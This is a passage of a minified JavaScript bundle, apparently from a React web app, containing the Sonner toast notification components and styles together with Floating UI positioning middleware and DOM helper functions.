translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}to{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}to{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}to{opacity:.15}}@media (prefers-reduced-motion){[data-sonner-toast],[data-sonner-toast]>*,.sonner-loading-bar{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}
`);function jo(t){return t.label!==void 0}var lN=3,cN="32px",dN=4e3,uN=356,hN=14,fN=20,mN=200;function pN(...t){return t.filter(Boolean).join(" ")}var gN=t=>{var e,r,n,s,i,o,l,c,d,u;let{invert:h,toast:f,unstyled:m,interacting:g,setHeights:v,visibleToasts:w,heights:y,index:x,toasts:b,expanded:j,removeToast:_,defaultRichColors:N,closeButton:S,style:k,cancelButtonStyle:C,actionButtonStyle:T,className:M="",descriptionClassName:A="",duration:R,position:I,gap:J,loadingIcon:K,expandByDefault:ne,classNames:P,icons:z,closeButtonAriaLabel:Q="Close toast",pauseWhenPageIsHidden:H,cn:te}=t,[ie,_e]=F.useState(!1),[Ye,ge]=F.useState(!1),[Je,$t]=F.useState(!1),[Ut,B]=F.useState(!1),[Y,ee]=F.useState(0),[pe,ye]=F.useState(0),he=F.useRef(null),E=F.useRef(null),U=x===0,O=x+1<=w,V=f.type,se=f.dismissible!==!1,St=f.className||"",Be=f.descriptionClassName||"",On=F.useMemo(()=>y.findIndex(oe=>oe.toastId===f.id)||0,[y,f.id]),vc=F.useMemo(()=>{var oe;return(oe=f.closeButton)!=null?oe:S},[f.closeButton,S]),_s=F.useMemo(()=>f.duration||R||dN,[f.duration,R]),bc=F.useRef(0),Ns=F.useRef(0),jf=F.useRef(0),Ss=F.useRef(null),[_f,cb]=I.split("-"),Nf=F.useMemo(()=>y.reduce((oe,Te,ke)=>ke>=On?oe:oe+Te.height,0),[y,On]),Sf=tN(),db=f.invert||h,wc=V==="loading";Ns.current=F.useMemo(()=>On*J+Nf,[On,Nf]),F.useEffect(()=>{_e(!0)},[]),F.useLayoutEffect(()=>{if(!ie)return;let oe=E.current,Te=oe.style.height;oe.style.height="auto";let ke=oe.getBoundingClientRect().height;oe.style.height=Te,ye(ke),v(mr=>mr.find(pr=>pr.toastId===f.id)?mr.map(pr=>pr.toastId===f.id?{...pr,height:ke}:pr):[{toastId:f.id,height:ke,position:f.position},...mr])},[ie,f.title,f.description,v,f.id]);let Wr=F.useCallback(()=>{ge(!0),ee(Ns.current),v(oe=>oe.filter(Te=>Te.toastId!==f.id)),setTimeout(()=>{_(f)},mN)},[f,_,v,Ns]);F.useEffect(()=>{if(f.promise&&V==="loading"||f.duration===1/0||f.type==="loading")return;let oe,Te=_s;return j||g||H&&Sf?(()=>{if(jf.current<bc.current){let ke=new Date().getTime()-bc.current;Te=Te-ke}jf.current=new Date().getTime()})():Te!==1/0&&(bc.current=new Date().getTime(),oe=setTimeout(()=>{var ke;(ke=f.onAutoClose)==null||ke.call(f,f),Wr()},Te)),()=>clearTimeout(oe)},[j,g,ne,f,_s,Wr,f.promise,V,H,Sf]),F.useEffect(()=>{let oe=E.current;if(oe){let Te=oe.getBoundingClientRect().height;return ye(Te),v(ke=>[{toastId:f.id,height:Te,position:f.position},...ke]),()=>v(ke=>ke.filter(mr=>mr.toastId!==f.id))}},[v,f.id]),F.useEffect(()=>{f.delete&&Wr()},[Wr,f.delete]);function ub(){return z!=null&&z.loading?F.createElement("div",{className:"sonner-loader","data-visible":V==="loading"},z.loading):K?F.createElement("div",{className:"sonner-loader","data-visible":V==="loading"},K):F.createElement(Y_,{visible:V==="loading"})}return F.createElement("li",{"aria-live":f.important?"assertive":"polite","aria-atomic":"true",role:"status",tabIndex:0,ref:E,className:te(M,St,P==null?void 0:P.toast,(e=f==null?void 0:f.classNames)==null?void 0:e.toast,P==null?void 0:P.default,P==null?void 0:P[V],(r=f==null?void 0:f.classNames)==null?void 0:r[V]),"data-sonner-toast":"","data-rich-colors":(n=f.richColors)!=null?n:N,"data-styled":!(f.jsx||f.unstyled||m),"data-mounted":ie,"data-promise":!!f.promise,"data-removed":Ye,"data-visible":O,"data-y-position":_f,"data-x-position":cb,"data-index":x,"data-front":U,"data-swiping":Je,"data-dismissible":se,"data-type":V,"data-invert":db,"data-swipe-out":Ut,"data-expanded":!!(j||ne&&ie),style:{"--index":x,"--toasts-before":x,"--z-index":b.length-x,"--offset":`${Ye?Y:Ns.current}px`,"--initial-height":ne?"auto":`${pe}px`,...k,...f.style},onPointerDown:oe=>{wc||!se||(he.current=new Date,ee(Ns.current),oe.target.setPointerCapture(oe.pointerId),oe.target.tagName!=="BUTTON"&&($t(!0),Ss.current={x:oe.clientX,y:oe.clientY}))},onPointerUp:()=>{var oe,Te,ke,mr;if(Ut||!se)return;Ss.current=null;let pr=Number(((oe=E.current)==null?void 0:oe.style.getPropertyValue("--swipe-amount").replace("px",""))||0),eo=new Date().getTime()-((Te=he.current)==null?void 0:Te.getTime()),hb=Math.abs(pr)/eo;if(Math.abs(pr)>=fN||hb>.11){ee(Ns.current),(ke=f.onDismiss)==null||ke.call(f,f),Wr(),B(!0);return}(mr=E.current)==null||mr.style.setProperty("--swipe-amount","0px"),$t(!1)},onPointerMove:oe=>{var Te;if(!Ss.current||!se)return;let ke=oe.clientY-Ss.current.y,mr=oe.clientX-Ss.current.x,pr=(_f==="top"?Math.min:Math.max)(0,ke),eo=oe.pointerType==="touch"?10:2;Math.abs(pr)>eo?(Te=E.current)==null||Te.style.setProperty("--swipe-amount",`${ke}px`):Math.abs(mr)>eo&&(Ss.current=null)}},vc&&!f.jsx?F.createElement("button",{"aria-label":Q,"data-disabled":wc,"data-close-button":!0,onClick:wc||!se?()=>{}:()=>{var oe;Wr(),(oe=f.onDismiss)==null||oe.call(f,f)},className:te(P==null?void 0:P.closeButton,(s=f==null?void 0:f.classNames)==null?void 0:s.closeButton)},F.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",width:"12",height:"12",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:"1.5",strokeLinecap:"round",strokeLinejoin:"round"},F.createElement("line",{x1:"18",y1:"6",x2:"6",y2:"18"}),F.createElement("line",{x1:"6",y1:"6",x2:"18",y2:"18"}))):null,f.jsx||F.isValidElement(f.title)?f.jsx||f.title:F.createElement(F.Fragment,null,V||f.icon||f.promise?F.createElement("div",{"data-icon":"",className:te(P==null?void 0:P.icon,(i=f==null?void 0:f.classNames)==null?void 0:i.icon)},f.promise||f.type==="loading"&&!f.icon?f.icon||ub():null,f.type!=="loading"?f.icon||(z==null?void 0:z[V])||q_(V):null):null,F.createElement("div",{"data-content":"",className:te(P==null?void 0:P.content,(o=f==null?void 0:f.classNames)==null?void 0:o.content)},F.createElement("div",{"data-title":"",className:te(P==null?void 0:P.title,(l=f==null?void 0:f.classNames)==null?void 0:l.title)},f.title),f.description?F.createElement("div",{"data-description":"",className:te(A,Be,P==null?void 0:P.description,(c=f==null?void 0:f.classNames)==null?void 0:c.description)},f.description):null),F.isValidElement(f.cancel)?f.cancel:f.cancel&&jo(f.cancel)?F.createElement("button",{"data-button":!0,"data-cancel":!0,style:f.cancelButtonStyle||C,onClick:oe=>{var Te,ke;jo(f.cancel)&&se&&((ke=(Te=f.cancel).onClick)==null||ke.call(Te,oe),Wr())},className:te(P==null?void 0:P.cancelButton,(d=f==null?void 0:f.classNames)==null?void 0:d.cancelButton)},f.cancel.label):null,F.isValidElement(f.action)?f.action:f.action&&jo(f.action)?F.createElement("button",{"data-button":!0,"data-action":!0,style:f.actionButtonStyle||T,onClick:oe=>{var Te,ke;jo(f.action)&&(oe.defaultPrevented||((ke=(Te=f.action).onClick)==null||ke.call(Te,oe),Wr()))},className:te(P==null?void 0:P.actionButton,(u=f==null?void 0:f.classNames)==null?void 0:u.actionButton)},f.action.label):null))};function Qm(){if(typeof window>"u"||typeof document>"u")return"ltr";let t=document.documentElement.getAttribute("dir");return t==="auto"||!t?window.getComputedStyle(document.documentElement).direction:t}var xN=t=>{let{invert:e,position:r="bottom-right",hotkey:n=["altKey","KeyT"],expand:s,closeButton:i,className:o,offset:l,theme:c="light",richColors:d,duration:u,style:h,visibleToasts:f=lN,toastOptions:m,dir:g=Qm(),gap:v=hN,loadingIcon:w,icons:y,containerAriaLabel:x="Notifications",pauseWhenPageIsHidden:b,cn:j=pN}=t,[_,N]=F.useState([]),S=F.useMemo(()=>Array.from(new Set([r].concat(_.filter(H=>H.position).map(H=>H.position)))),[_,r]),[k,C]=F.useState([]),[T,M]=F.useState(!1),[A,R]=F.useState(!1),[I,J]=F.useState(c!=="system"?c:typeof window<"u"&&window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"),K=F.useRef(null),ne=n.join("+").replace(/Key/g,"").replace(/Digit/g,""),P=F.useRef(null),z=F.useRef(!1),Q=F.useCallback(H=>{var te;(te=_.find(ie=>ie.id===H.id))!=null&&te.delete||Et.dismiss(H.id),N(ie=>ie.filter(({id:_e})=>_e!==H.id))},[_]);return F.useEffect(()=>Et.subscribe(H=>{if(H.dismiss){N(te=>te.map(ie=>ie.id===H.id?{...ie,delete:!0}:ie));return}setTimeout(()=>{vx.flushSync(()=>{N(te=>{let ie=te.findIndex(_e=>_e.id===H.id);return ie!==-1?[...te.slice(0,ie),{...te[ie],...H},...te.slice(ie+1)]:[H,...te]})})})}),[]),F.useEffect(()=>{if(c!=="system"){J(c);return}c==="system"&&(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?J("dark"):J("light")),typeof window<"u"&&window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",({matches:H})=>{J(H?"dark":"light")})},[c]),F.useEffect(()=>{_.length<=1&&M(!1)},[_]),F.useEffect(()=>{let H=te=>{var ie,_e;n.every(Ye=>te[Ye]||te.code===Ye)&&(M(!0),(ie=K.current)==null||ie.focus()),te.code==="Escape"&&(document.activeElement===K.current||(_e=K.current)!=null&&_e.contains(document.activeElement))&&M(!1)};return document.addEventListener("keydown",H),()=>document.removeEventListener("keydown",H)},[n]),F.useEffect(()=>{if(K.current)return()=>{P.current&&(P.current.focus({preventScroll:!0}),P.current=null,z.current=!1)}},[K.current]),_.length?F.createElement("section",{"aria-label":`${x} ${ne}`,tabIndex:-1},S.map((H,te)=>{var ie;let[_e,Ye]=H.split("-");return F.createElement("ol",{key:H,dir:g==="auto"?Qm():g,tabIndex:-1,ref:K,className:o,"data-sonner-toaster":!0,"data-theme":I,"data-y-position":_e,"data-x-position":Ye,style:{"--front-toast-height":`${((ie=k[0])==null?void 0:ie.height)||0}px`,"--offset":typeof l=="number"?`${l}px`:l||cN,"--width":`${uN}px`,"--gap":`${v}px`,...h},onBlur:ge=>{z.current&&!ge.currentTarget.contains(ge.relatedTarget)&&(z.current=!1,P.current&&(P.current.focus({preventScroll:!0}),P.current=null))},onFocus:ge=>{ge.target instanceof HTMLElement&&ge.target.dataset.dismissible==="false"||z.current||(z.current=!0,P.current=ge.relatedTarget)},onMouseEnter:()=>M(!0),onMouseMove:()=>M(!0),onMouseLeave:()=>{A||M(!1)},onPointerDown:ge=>{ge.target instanceof HTMLElement&&ge.target.dataset.dismissible==="false"||R(!0)},onPointerUp:()=>R(!1)},_.filter(ge=>!ge.position&&te===0||ge.position===H).map((ge,Je)=>{var $t,Ut;return F.createElement(gN,{key:ge.id,icons:y,index:Je,toast:ge,defaultRichColors:d,duration:($t=m==null?void 0:m.duration)!=null?$t:u,className:m==null?void 0:m.className,descriptionClassName:m==null?void 0:m.descriptionClassName,invert:e,visibleToasts:f,closeButton:(Ut=m==null?void 0:m.closeButton)!=null?Ut:i,interacting:A,position:H,style:m==null?void 0:m.style,unstyled:m==null?void 0:m.unstyled,classNames:m==null?void 0:m.classNames,cancelButtonStyle:m==null?void 0:m.cancelButtonStyle,actionButtonStyle:m==null?void 0:m.actionButtonStyle,removeToast:Q,toasts:_.filter(B=>B.position==ge.position),heights:k.filter(B=>B.position==ge.position),setHeights:C,expandByDefault:s,gap:v,loadingIcon:w,expanded:T,pauseWhenPageIsHidden:b,cn:j})}))})):null};const yN=({...t})=>{const{theme:e="system"}=B_();return a.jsx(xN,{theme:e,className:"toaster group",toastOptions:{classNames:{toast:"group toast group-[.toaster]:bg-background group-[.toaster]:text-foreground group-[.toaster]:border-border group-[.toaster]:shadow-lg",description:"group-[.toast]:text-muted-foreground",actionButton:"group-[.toast]:bg-primary group-[.toast]:text-primary-foreground",cancelButton:"group-[.toast]:bg-muted group-[.toast]:text-muted-foreground"}},...t})};var vN=gp.useId||(()=>{}),bN=0;function my(t){const[e,r]=p.useState(vN());return _n(()=>{t||r(n=>n??String(bN++))},[t]),t||(e?`radix-${e}`:"")}const wN=["top","right","bottom","left"],En=Math.min,Tt=Math.max,jl=Math.round,_o=Math.floor,Cn=t=>({x:t,y:t}),jN={left:"right",right:"left",bottom:"top",top:"bottom"},_N={start:"end",end:"start"};function hu(t,e,r){return Tt(t,En(e,r))}function Vr(t,e){return typeof t=="function"?t(e):t}function Hr(t){return t.split("-")[0]}function Pa(t){return t.split("-")[1]}function Zh(t){return t==="x"?"y":"x"}function ef(t){return t==="y"?"height":"width"}function Tn(t){return["top","bottom"].includes(Hr(t))?"y":"x"}function tf(t){return Zh(Tn(t))}function NN(t,e,r){r===void 0&&(r=!1);const n=Pa(t),s=tf(t),i=ef(s);let o=s==="x"?n===(r?"end":"start")?"right":"left":n==="start"?"bottom":"top";return e.reference[i]>e.floating[i]&&(o=_l(o)),[o,_l(o)]}function SN(t){const e=_l(t);return[fu(t),e,fu(e)]}function fu(t){return t.replace(/start|end/g,e=>_N[e])}function kN(t,e,r){const n=["left","right"],s=["right","left"],i=["top","bottom"],o=["bottom","top"];switch(t){case"top":case"bottom":return r?e?s:n:e?n:s;case"left":case"right":return e?i:o;default:return[]}}function EN(t,e,r,n){const s=Pa(t);let i=kN(Hr(t),r==="start",n);return s&&(i=i.map(o=>o+"-"+s),e&&(i=i.concat(i.map(fu)))),i}function _l(t){return t.replace(/left|right|bottom|top/g,e=>jN[e])}function CN(t){return{top:0,right:0,bottom:0,left:0,...t}}function py(t){return typeof t!="number"?CN(t):{top:t,right:t,bottom:t,left:t}}function Nl(t){const{x:e,y:r,width:n,height:s}=t;return{width:n,height:s,top:r,left:e,right:e+n,bottom:r+s,x:e,y:r}}function Ym(t,e,r){let{reference:n,floating:s}=t;const i=Tn(e),o=tf(e),l=ef(o),c=Hr(e),d=i==="y",u=n.x+n.width/2-s.width/2,h=n.y+n.height/2-s.height/2,f=n[l]/2-s[l]/2;let m;switch(c){case"top":m={x:u,y:n.y-s.height};break;case"bottom":m={x:u,y:n.y+n.height};break;case"right":m={x:n.x+n.width,y:h};break;case"left":m={x:n.x-s.width,y:h};break;default:m={x:n.x,y:n.y}}switch(Pa(e)){case"start":m[o]-=f*(r&&d?-1:1);break;case"end":m[o]+=f*(r&&d?-1:1);break}return m}const TN=async(t,e,r)=>{const{placement:n="bottom",strategy:s="absolute",middleware:i=[],platform:o}=r,l=i.filter(Boolean),c=await(o.isRTL==null?void 0:o.isRTL(e));let d=await o.getElementRects({reference:t,floating:e,strategy:s}),{x:u,y:h}=Ym(d,n,c),f=n,m={},g=0;for(let v=0;v<l.length;v++){const{name:w,fn:y}=l[v],{x,y:b,data:j,reset:_}=await y({x:u,y:h,initialPlacement:n,placement:f,strategy:s,middlewareData:m,rects:d,platform:o,elements:{reference:t,floating:e}});u=x??u,h=b??h,m={...m,[w]:{...m[w],...j}},_&&g<=50&&(g++,typeof _=="object"&&(_.placement&&(f=_.placement),_.rects&&(d=_.rects===!0?await o.getElementRects({reference:t,floating:e,strategy:s}):_.rects),{x:u,y:h}=Ym(d,f,c)),v=-1)}return{x:u,y:h,placement:f,strategy:s,middlewareData:m}};async function Ii(t,e){var r;e===void 0&&(e={});const{x:n,y:s,platform:i,rects:o,elements:l,strategy:c}=t,{boundary:d="clippingAncestors",rootBoundary:u="viewport",elementContext:h="floating",altBoundary:f=!1,padding:m=0}=Vr(e,t),g=py(m),w=l[f?h==="floating"?"reference":"floating":h],y=Nl(await i.getClippingRect({element:(r=await(i.isElement==null?void 0:i.isElement(w)))==null||r?w:w.contextElement||await(i.getDocumentElement==null?void 0:i.getDocumentElement(l.floating)),boundary:d,rootBoundary:u,strategy:c})),x=h==="floating"?{x:n,y:s,width:o.floating.width,height:o.floating.height}:o.reference,b=await(i.getOffsetParent==null?void 0:i.getOffsetParent(l.floating)),j=await(i.isElement==null?void 0:i.isElement(b))?await(i.getScale==null?void 0:i.getScale(b))||{x:1,y:1}:{x:1,y:1},_=Nl(i.convertOffsetParentRelativeRectToViewportRelativeRect?await i.convertOffsetParentRelativeRectToViewportRelativeRect({elements:l,rect:x,offsetParent:b,strategy:c}):x);return{top:(y.top-_.top+g.top)/j.y,bottom:(_.bottom-y.bottom+g.bottom)/j.y,left:(y.left-_.left+g.left)/j.x,right:(_.right-y.right+g.right)/j.x}}const PN=t=>({name:"arrow",options:t,async fn(e){const{x:r,y:n,placement:s,rects:i,platform:o,elements:l,middlewareData:c}=e,{element:d,padding:u=0}=Vr(t,e)||{};if(d==null)return{};const h=py(u),f={x:r,y:n},m=tf(s),g=ef(m),v=await o.getDimensions(d),w=m==="y",y=w?"top":"left",x=w?"bottom":"right",b=w?"clientHeight":"clientWidth",j=i.reference[g]+i.reference[m]-f[m]-i.floating[g],_=f[m]-i.reference[m],N=await(o.getOffsetParent==null?void 0:o.getOffsetParent(d));let S=N?N[b]:0;(!S||!await(o.isElement==null?void 0:o.isElement(N)))&&(S=l.floating[b]||i.floating[g]);const k=j/2-_/2,C=S/2-v[g]/2-1,T=En(h[y],C),M=En(h[x],C),A=T,R=S-v[g]-M,I=S/2-v[g]/2+k,J=hu(A,I,R),K=!c.arrow&&Pa(s)!=null&&I!==J&&i.reference[g]/2-(I<A?T:M)-v[g]/2<0,ne=K?I<A?I-A:I-R:0;return{[m]:f[m]+ne,data:{[m]:J,centerOffset:I-J-ne,...K&&{alignmentOffset:ne}},reset:K}}}),AN=function(t){return t===void 0&&(t={}),{name:"flip",options:t,async fn(e){var r,n;const{placement:s,middlewareData:i,rects:o,initialPlacement:l,platform:c,elements:d}=e,{mainAxis:u=!0,crossAxis:h=!0,fallbackPlacements:f,fallbackStrategy:m="bestFit",fallbackAxisSideDirection:g="none",flipAlignment:v=!0,...w}=Vr(t,e);if((r=i.arrow)!=null&&r.alignmentOffset)return{};const y=Hr(s),x=Tn(l),b=Hr(l)===l,j=await(c.isRTL==null?void 0:c.isRTL(d.floating)),_=f||(b||!v?[_l(l)]:SN(l)),N=g!=="none";!f&&N&&_.push(...EN(l,v,g,j));const S=[l,..._],k=await Ii(e,w),C=[];let T=((n=i.flip)==null?void 0:n.overflows)||[];if(u&&C.push(k[y]),h){const I=NN(s,o,j);C.push(k[I[0]],k[I[1]])}if(T=[...T,{placement:s,overflows:C}],!C.every(I=>I<=0)){var M,A;const I=(((M=i.flip)==null?void 0:M.index)||0)+1,J=S[I];if(J)return{data:{index:I,overflows:T},reset:{placement:J}};let K=(A=T.filter(ne=>ne.overflows[0]<=0).sort((ne,P)=>ne.overflows[1]-P.overflows[1])[0])==null?void 0:A.placement;if(!K)switch(m){case"bestFit":{var R;const ne=(R=T.filter(P=>{if(N){const z=Tn(P.placement);return z===x||z==="y"}return!0}).map(P=>[P.placement,P.overflows.filter(z=>z>0).reduce((z,Q)=>z+Q,0)]).sort((P,z)=>P[1]-z[1])[0])==null?void 0:R[0];ne&&(K=ne);break}case"initialPlacement":K=l;break}if(s!==K)return{reset:{placement:K}}}return{}}}};function Jm(t,e){return{top:t.top-e.height,right:t.right-e.width,bottom:t.bottom-e.height,left:t.left-e.width}}function Xm(t){return wN.some(e=>t[e]>=0)}const RN=function(t){return t===void 0&&(t={}),{name:"hide",options:t,async fn(e){const{rects:r}=e,{strategy:n="referenceHidden",...s}=Vr(t,e);switch(n){case"referenceHidden":{const i=await Ii(e,{...s,elementContext:"reference"}),o=Jm(i,r.reference);return{data:{referenceHiddenOffsets:o,referenceHidden:Xm(o)}}}case"escaped":{const i=await Ii(e,{...s,altBoundary:!0}),o=Jm(i,r.floating);return{data:{escapedOffsets:o,escaped:Xm(o)}}}default:return{}}}}};async function IN(t,e){const{placement:r,platform:n,elements:s}=t,i=await(n.isRTL==null?void 0:n.isRTL(s.floating)),o=Hr(r),l=Pa(r),c=Tn(r)==="y",d=["left","top"].includes(o)?-1:1,u=i&&c?-1:1,h=Vr(e,t);let{mainAxis:f,crossAxis:m,alignmentAxis:g}=typeof h=="number"?{mainAxis:h,crossAxis:0,alignmentAxis:null}:{mainAxis:h.mainAxis||0,crossAxis:h.crossAxis||0,alignmentAxis:h.alignmentAxis};return l&&typeof g=="number"&&(m=l==="end"?g*-1:g),c?{x:m*u,y:f*d}:{x:f*d,y:m*u}}const LN=function(t){return t===void 0&&(t=0),{name:"offset",options:t,async fn(e){var r,n;const{x:s,y:i,placement:o,middlewareData:l}=e,c=await IN(e,t);return o===((r=l.offset)==null?void 0:r.placement)&&(n=l.arrow)!=null&&n.alignmentOffset?{}:{x:s+c.x,y:i+c.y,data:{...c,placement:o}}}}},MN=function(t){return t===void 0&&(t={}),{name:"shift",options:t,async fn(e){const{x:r,y:n,placement:s}=e,{mainAxis:i=!0,crossAxis:o=!1,limiter:l={fn:w=>{let{x:y,y:x}=w;return{x:y,y:x}}},...c}=Vr(t,e),d={x:r,y:n},u=await Ii(e,c),h=Tn(Hr(s)),f=Zh(h);let m=d[f],g=d[h];if(i){const w=f==="y"?"top":"left",y=f==="y"?"bottom":"right",x=m+u[w],b=m-u[y];m=hu(x,m,b)}if(o){const w=h==="y"?"top":"left",y=h==="y"?"bottom":"right",x=g+u[w],b=g-u[y];g=hu(x,g,b)}const v=l.fn({...e,[f]:m,[h]:g});return{...v,data:{x:v.x-r,y:v.y-n,enabled:{[f]:i,[h]:o}}}}}},ON=function(t){return t===void 0&&(t={}),{options:t,fn(e){const{x:r,y:n,placement:s,rects:i,middlewareData:o}=e,{offset:l=0,mainAxis:c=!0,crossAxis:d=!0}=Vr(t,e),u={x:r,y:n},h=Tn(s),f=Zh(h);let m=u[f],g=u[h];const v=Vr(l,e),w=typeof v=="number"?{mainAxis:v,crossAxis:0}:{mainAxis:0,crossAxis:0,...v};if(c){const b=f==="y"?"height":"width",j=i.reference[f]-i.floating[b]+w.mainAxis,_=i.reference[f]+i.reference[b]-w.mainAxis;m<j?m=j:m>_&&(m=_)}if(d){var y,x;const b=f==="y"?"width":"height",j=["top","left"].includes(Hr(s)),_=i.reference[h]-i.floating[b]+(j&&((y=o.offset)==null?void 0:y[h])||0)+(j?0:w.crossAxis),N=i.reference[h]+i.reference[b]+(j?0:((x=o.offset)==null?void 0:x[h])||0)-(j?w.crossAxis:0);g<_?g=_:g>N&&(g=N)}return{[f]:m,[h]:g}}}},$N=function(t){return t===void 0&&(t={}),{name:"size",options:t,async fn(e){var r,n;const{placement:s,rects:i,platform:o,elements:l}=e,{apply:c=()=>{},...d}=Vr(t,e),u=await Ii(e,d),h=Hr(s),f=Pa(s),m=Tn(s)==="y",{width:g,height:v}=i.floating;let w,y;h==="top"||h==="bottom"?(w=h,y=f===(await(o.isRTL==null?void 0:o.isRTL(l.floating))?"start":"end")?"left":"right"):(y=h,w=f==="end"?"top":"bottom");const x=v-u.top-u.bottom,b=g-u.left-u.right,j=En(v-u[w],x),_=En(g-u[y],b),N=!e.middlewareData.shift;let S=j,k=_;if((r=e.middlewareData.shift)!=null&&r.enabled.x&&(k=b),(n=e.middlewareData.shift)!=null&&n.enabled.y&&(S=x),N&&!f){const T=Tt(u.left,0),M=Tt(u.right,0),A=Tt(u.top,0),R=Tt(u.bottom,0);m?k=g-2*(T!==0||M!==0?T+M:Tt(u.left,u.right)):S=v-2*(A!==0||R!==0?A+R:Tt(u.top,u.bottom))}await c({...e,availableWidth:k,availableHeight:S});const C=await o.getDimensions(l.floating);return g!==C.width||v!==C.height?{reset:{rects:!0}}:{}}}};function ec(){return typeof window<"u"}function Aa(t){return gy(t)?(t.nodeName||"").toLowerCase():"#document"}function It(t){var e;return(t==null||(e=t.ownerDocument)==null?void 0:e.defaultView)||window}function Er(t){var e;return(e=(gy(t)?t.ownerDocument:t.document)||window.document)==null?void 0:e.documentElement}function gy(t){return ec()?t instanceof Node||t instanceof It(t).Node:!1}function hr(t){return ec()?t instanceof Element||t instanceof It(t).Element:!1}function kr(t){return ec()?t instanceof HTMLElement||t instanceof It(t).HTMLElement:!1}function Zm(t){return!ec()||typeof ShadowRoot>"u"?!1:t instanceof ShadowRoot||t instanceof It(t).ShadowRoot}function Ji(t){const{overflow:e,overflowX:r,overflowY:n,display:s}=fr(t);return/auto|scroll|overlay|hidden|clip/.test(e+n+r)&&!["inline","contents"].includes(s)}function UN(t){return["table","td","th"].includes(Aa(t))}function tc(t){return[":popover-open",":modal"].some(e=>{try{return t.matches(e)}catch{return!1}})}function rf(t){const e=nf(),r=hr(t)?fr(t):t;return r.transform!=="none"||r.perspective!=="none"||(r.containerType?r.containerType!=="normal":!1)||!e&&(r.backdropFilter?r.backdropFilter!=="none":!1)||!e&&(r.filter?r.filter!=="none":!1)||["transform","perspective","filter"].some(n=>(r.willChange||"").includes(n))||["paint","layout","strict","content"].some(n=>(r.contain||"").includes(n))}function DN(t){let e=Pn(t);for(;kr(e)&&!_a(e);){if(rf(e))return e;if(tc(e))return null;e=Pn(e)}return null}function nf(){return typeof CSS>"u"||!CSS.supports?!1:CSS.supports("-webkit-backdrop-filter","none")}function _a(t){return["html","body","#document"].includes(Aa(t))}function fr(t){return It(t).getComputedStyle(t)}function rc(t){return hr(t)?{scrollLeft:t.scrollLeft,scrollTop:t.scrollTop}:{scrollLeft:t.scrollX,scrollTop:t.scrollY}}function Pn(t){if(Aa(t)==="html")return t;const e=t.assignedSlot||t.parentNode||Zm(t)&&t.host||Er(t);return Zm(e)?e.host:e}function xy(t){const e=Pn(t);return _a(e)?t.ownerDocument?t.ownerDocument.body:t.body:kr(e)&&Ji(e)?e:xy(e)}function Li(t,e,r){var n;e===void 0&&(e=[]),r===void 0&&(r=!0);const s=xy(t),i=s===((n=t.ownerDocument)==null?void 0:n.body),o=It(s);if(i){const l=mu(o);return e.concat(o,o.visualViewport||[],Ji(s)?s:[],l&&r?Li(l):[])}return e.concat(s,Li(s,[],r))}function mu(t){return t.parent&&Object.getPrototypeOf(t.parent)?t.frameElement:null}function yy(t){const e=fr(t);let r=parseFloat(e.width)||0,n=parseFloat(e.height)||0;const s=kr(t),i=s?t.offsetWidth:r,o=s?t.offsetHeight:n,l=jl(r)!==i||jl(n)!==o;return l&&(r=i,n=o),{width:r,height:n,$:l}}function sf(t){return hr(t)?t:t.contextElement}function na(t){const e=sf(t);if(!kr(e))return Cn(1);const r=e.getBoundingClientRect(),{width:n,height:s,$:i}=yy(e);let o=(i?jl(r.width):r.width)/n,l=(i?jl(r.height):r.height)/s;return(!o||!Number.isFinite(o))&&(o=1),(!l||!Number.isFinite(l))&&(l=1),{x:o,y:l}}const zN=Cn(0);function vy(t){const e=It(t);return!nf()||!e.visualViewport?zN:{x:e.visualViewport.offsetLeft,y:e.visualViewport.offsetTop}}function FN(t,e,r){return e===void 0&&(e=!1),!r||e&&r!==It(t)?!1:e}function vs(t,e,r,n){e===void 0&&(e=!1),r===void 0&&(r=!1);const s=t.getBoundingClientRect(),i=sf(t);let o=Cn(1);e&&(n?hr(n)&&(o=na(n)):o=na(t));const l=FN(i,r,n)?vy(i):Cn(0);let c=(s.left+l.x)/o.x,d=(s.top+l.y)/o.y,u=s.width/o.x,h=s.height/o.y;if(i){const f=It(i),m=n&&hr(n)?It(n):n;let g=f,v=mu(g);for(;v&&n&&m!==g;){const w=na(v),y=v.getBoundingClientRect(),x=fr(v),b=y.left+(v.clientLeft+parseFloat(x.paddingLeft))*w.x,j=y.top+(v.clientTop+parseFloat(x.paddingTop))*w.y;c*=w.x,d*=w.y,u*=w.x,h*=w.y,c+=b,d+=j,g=It(v),v=mu(g)}}return Nl({width:u,height:h,x:c,y:d})}function BN(t){let{elements:e,rect:r,offsetParent:n,strategy:s}=t;const i=s==="fixed",o=Er(n),l=e?tc(e.floating):!1;if(n===o||l&&i)return r;let c={scrollLeft:0,scrollTop:0},d=Cn(1);const u=Cn(0),h=kr(n);if((h||!h&&!i)&&((Aa(n)!=="body"||Ji(o))&&(c=rc(n)),kr(n))){const 